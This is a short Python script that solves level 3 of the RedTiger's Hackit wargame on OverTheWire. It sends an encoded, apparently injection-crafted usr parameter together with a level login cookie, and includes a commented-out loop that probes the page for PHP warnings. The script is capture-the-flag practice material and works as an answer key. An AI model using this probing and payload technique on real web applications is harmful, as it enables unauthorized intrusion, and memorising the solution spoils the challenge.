import requests

url = "https://redtiger.labs.overthewire.org/level3.php"
cookies = {"level3login" : "feed_the_cat_who_eats_your_bread"}
# preg_match() expects parameter 2 to be string, array given in <b>/var/www/html/hackit/urlcrypt.inc
#url2 = "https://redtiger.labs.overthewire.org/urlcrypt.inc"
#r2 = requests.get(url2)
"""
with open('test3', 'rb') as f :
    data = f.readlines()
c = 1
for line in data :
    #print line.rstrip()
    print c
    payload = "?usr="+line
    r = requests.get(url+payload, cookies=cookies)
    if "<b>Warning</b>" in r.text :
        c += 1
        continue
    print r.text
    break"""
# done in 7

payload = "?usr=MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDIwMjM4MDE1MTI3MTMzMTkwMTU0MDAxMjQ2MTU3MjA4MjQ1MDQ1MTk4MTMxMTE1MTE5MTYyMTMwMTQyMjUwMDUwMTE0MjUyMjAzMDk3MTU2MTkwMTc1MDEzMTM5MDc4MTU1MDk2MDg1MTM0MTk3MTE5MDU5MTYzMTc4MDU2MDM3MDAzMTM2MDQ3MDY2MTA2MTE0MDQ2MjA2MTQ4MDcyMTQxMjE0MDc1MDQ0MjE1MjAzMDM3MDgyMTk4MDcyMTIzMjE1MTE0MjIwMTQw"
r = requests.get(url+payload, cookies=cookies)
print r.text
